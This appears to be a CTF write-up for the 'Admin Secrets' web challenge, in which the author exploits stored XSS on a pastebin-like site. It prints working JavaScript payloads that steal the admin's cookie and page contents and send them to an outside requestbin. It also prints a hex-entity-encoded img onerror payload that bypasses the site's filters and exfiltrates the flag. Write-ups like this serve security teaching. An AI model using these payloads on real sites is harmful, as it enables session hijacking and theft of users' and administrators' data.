# Admin Secrets

## Problem

See if you can get the flag from the admin at this website!

Written by avz92

## Solution

This was probably one of my favourite challenges from the CTF (that is after the update was added where the challenge gave more feedback)

Visiting the website, we can create an account. The website is called Textbin, very similar to a Pastebin where you can type text and it will save it as a post. It also let's you report posts to the admin. That sounds very much like a Cross Site Scripting (XSS) attack.  

Trying `<script>alert(1)</script>` confirms that.

Like with most XSS challenges, I assumed we need to steal the admin's session cookie allowing us to login as them. So I wrote a small cookie stealing script and have the admin's cookie sent over to a requestbin. 

```js
<script>
  req = new XMLHttpRequest(); 
  req.open('GET', 'https://en80on4rjnaxk.x.pipedream.net/?cookie=' + document.cookie); 
  req.send();
</script>
```

From that we get:
`hint="Check the admin console!\012"`

Looking at the source code of the page where it says report to admin, we can see a div,

```html
<div class="col-8 admin_console" >
  <!-- Only the admin can see this -->
</div>
```

So instead of stealing `document.cookie` let's steal `document.getElementsByClassName("admin_console")[0].innerHTML`

However, there is one additional step due to the fact that the admin console is loaded after our XSS executes so we need to add an event listener to run the XSS after everything has been rendered

```js
<script>
document.addEventListener("DOMContentLoaded", function(event){
  req = new XMLHttpRequest(); 
  req.open('GET', 'https://enl502avnnt87.x.pipedream.net/?output=' + encodeURI(document.getElementsByClassName("admin_console")[0].innerHTML)); 
  req.send();
});
</script>
```

From that we get:
```html
<!-- Only the admin can see this --> 
<button class="btn btn-primary flag-button">Access Flag</button>
<a href="/button" class="btn btn-primary other-button">Delete User</a>
<a href="/button" class="btn btn-primary other-button">Delete Post</a>
```

Instead of simulating the press of the flag button, I opted to simply leak the entire source code and see what pressing the button does.

```js
<script>
document.addEventListener("DOMContentLoaded", function(event){
  req = new XMLHttpRequest();
  req.open('GET', 'https://en80on4rjnaxk.x.pipedream.net/?output=' + btoa(document.getElementsByTagName('HTML')[0].innerHTML));
  req.send();
});
</script>
```

We can see the button simply makes a get request to `/admin_flag` endpoint.

I thought I was really close to solving it at this point, simply needed to make the admin visit that endpoint and sent its contents to the requestbin. 

```js
<script>
req1 = new XMLHttpRequest();
req1.open('GET', '/admin_flag');
req1.onload = function() {
    var flag = req1.response;
    req = new XMLHttpRequest(); 
    req.open('GET', 'https://en80on4rjnaxk.x.pipedream.net/?output=' + encodeURI(flag)); 
    req.send();
}
req1.send();
</script>
```

Unfortunately, we don't get the flag from that. Instead we get:
```
This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Script tags found. Single quote found. Parenthesis found.
```

So looks like the author implemented some sort of filtering. The weird part is the XSS still works but looks like the flag got replaced by that.
After a lot of googling and research, I was able to find a way to bypass the checks the site makes. 

```html
<img src=1 onerror=&#x72&#x65&#x71&#x31&#x20&#x3d&#x20&#x6e&#x65&#x77&#x20&#x58&#x4d&#x4c&#x48&#x74&#x74&#x70&#x52&#x65&#x71&#x75&#x65&#x73&#x74&#x28&#x29&#x3b&#x0a&#x72&#x65&#x71&#x31&#x2e&#x6f&#x70&#x65&#x6e&#x28&#x60&#x47&#x45&#x54&#x60&#x2c&#x20&#x60&#x2f&#x61&#x64&#x6d&#x69&#x6e&#x5f&#x66&#x6c&#x61&#x67&#x60&#x29&#x3b&#x0a&#x72&#x65&#x71&#x31&#x2e&#x6f&#x6e&#x6c&#x6f&#x61&#x64&#x20&#x3d&#x20&#x66&#x75&#x6e&#x63&#x74&#x69&#x6f&#x6e&#x28&#x29&#x20&#x7b&#x20&#x0a&#x09&#x76&#x61&#x72&#x20&#x66&#x6c&#x61&#x67&#x20&#x3d&#x20&#x72&#x65&#x71&#x31&#x2e&#x72&#x65&#x73&#x70&#x6f&#x6e&#x73&#x65&#x3b&#x0a&#x09&#x72&#x65&#x71&#x20&#x3d&#x20&#x6e&#x65&#x77&#x20&#x58&#x4d&#x4c&#x48&#x74&#x74&#x70&#x52&#x65&#x71&#x75&#x65&#x73&#x74&#x28&#x29&#x3b&#x0a&#x09&#x72&#x65&#x71&#x2e&#x6f&#x70&#x65&#x6e&#x28&#x60&#x47&#x45&#x54&#x60&#x2c&#x20&#x60&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x65&#x6e&#x67&#x75&#x6a&#x7a&#x72&#x37&#x77&#x6c&#x79&#x30&#x6b&#x2e&#x78&#x2e&#x70&#x69&#x70&#x65&#x64&#x72&#x65&#x61&#x6d&#x2e&#x6e&#x65&#x74&#x2f&#x3f&#x6f&#x75&#x74&#x70&#x75&#x74&#x3d&#x60&#x20&#x2b&#x20&#x65&#x6e&#x63&#x6f&#x64&#x65&#x55&#x52&#x49&#x28&#x66&#x6c&#x61&#x67&#x29&#x29&#x3b&#x0a&#x09&#x72&#x65&#x71&#x2e&#x73&#x65&#x6e&#x64&#x28&#x29&#x3b&#x20&#x0a&#x09&#x7d&#x0a&#x72&#x65&#x71&#x31&#x2e&#x73&#x65&#x6e&#x64&#x28&#x29&#x3b />
```

The image source does not exist, so it goes to the onerror and executes the javascript which is encoded in hex. 

Flag: **tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}**
